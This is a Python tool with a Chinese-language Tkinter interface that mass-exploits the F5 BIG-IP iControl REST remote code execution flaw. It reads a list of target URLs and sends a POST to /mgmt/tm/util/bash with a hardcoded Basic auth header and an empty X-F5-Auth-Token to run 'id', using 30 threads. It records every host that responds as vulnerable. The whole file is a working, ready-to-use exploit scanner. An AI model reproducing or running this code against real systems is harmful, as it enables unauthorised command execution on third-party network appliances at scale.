import requests
import json
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def f5_big_ip_exp(url):
    poc = r"""/mgmt/tm/util/bash"""
    url = url + poc
    try:
        newurl = url.split('//')[1].split('/')[0]
        if ":" not in str(newurl):
            pass
        elif "[" in str(newurl):
            pass
        else:
            host = newurl.split(':')[0]
            port = newurl.split(':')[1]
            headers = {
                "Host":f'{host}:{port}',
                "Connection": "close",
                "Cache-Control": "max-age=0",
                "Authorization": "Basic YWRtaW46QVNhc1M=",
                "X-F5-Auth-Token":"",
                "Upgrade-Insecure-Requests": "1",
                "Content-Type": "application/json"
            }
            data = '{"command":"run","utilCmdArgs":"-c id"}'
            res = requests.post(url, headers=headers, data=data, verify=False, timeout=3)
            if "uid" in res.text:
                commandResult = json.loads(res.text)["commandResult"]
                f5_big_ip_text.insert(END,"---------------------------------\n【！！！！！！】存在漏洞的url：" + url + "；返回内容为：" + str(commandResult) + "---------------------------------\n")
                f5_big_ip_text.see(END)
                with open ("存在F5 BIG-IP 远程代码执行漏洞的url.txt", 'a') as f:
                    f.write(url + "\n")
            else:
                f5_big_ip_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
                f5_big_ip_text.see(END)
    except Exception as err:
        f5_big_ip_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        f5_big_ip_text.see(END)
def get_f5_big_ip_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def f5_big_ip_gui():
    f5_big_ip = tk.Tk()
    f5_big_ip.geometry("910x450")
    f5_big_ip.title("F5 BIG-IP 远程代码执行漏洞一把梭")
    f5_big_ip.resizable(0, 0)
    f5_big_ip.iconbitmap('logo.ico')
    global f5_big_ip_text
    f5_big_ip_text = scrolledtext.ScrolledText(f5_big_ip,width=123, height=25)
    f5_big_ip_text.grid(row=0, column=0, padx=10, pady=10)
    f5_big_ip_text.see(END)
    addrs = get_f5_big_ip_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(f5_big_ip_exp, addr)
    f5_big_ip.mainloop()